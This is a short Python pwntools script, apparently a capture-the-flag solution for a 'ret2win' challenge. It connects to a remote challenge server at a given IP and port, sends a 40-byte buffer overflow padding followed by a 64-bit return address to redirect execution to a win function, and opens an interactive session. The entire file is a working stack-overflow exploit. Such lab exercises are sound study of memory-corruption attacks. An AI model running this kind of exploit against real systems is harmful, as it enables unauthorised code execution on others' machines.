from pwn import *

# p = process('./ret2win')
p = connect('45.77.39.59', 10005)

payload = b'A'*40
payload += p64(0x00000000004011f6)

p.recvuntil(b'> ')
p.sendline(payload)

p.interactive()
